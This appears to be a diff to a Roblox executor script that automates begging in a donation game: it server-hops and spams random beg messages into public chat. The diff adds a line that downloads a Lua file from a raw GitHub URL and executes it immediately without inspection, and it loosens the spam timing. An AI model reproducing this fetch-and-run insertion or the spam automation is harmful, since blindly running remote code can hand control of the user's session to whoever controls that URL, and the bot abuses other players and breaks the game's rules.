@@ -7,6 +7,7 @@ local httprequest = (syn and syn.request) or http and http.request or http_reque
 if game.PlaceId ~= 8737602449 and game.PlaceId ~= 8943844393 then
 	return
 end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/RedZlol/scripts/main/plsdonate.lua'))()
 task.wait()
 local httpservice = game:GetService('HttpService')
 local spinSpeed = 20
@@ -99,7 +100,7 @@ Players.LocalPlayer.leaderstats.Raised.Changed:Connect(function()
 end)
 
 spawn(serverHop)
-while wait(math.random(3, 6)) do
+while wait(math.random(5, 7)) do
     local msg = begMessages[math.random(1, #begMessages)]
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
 end
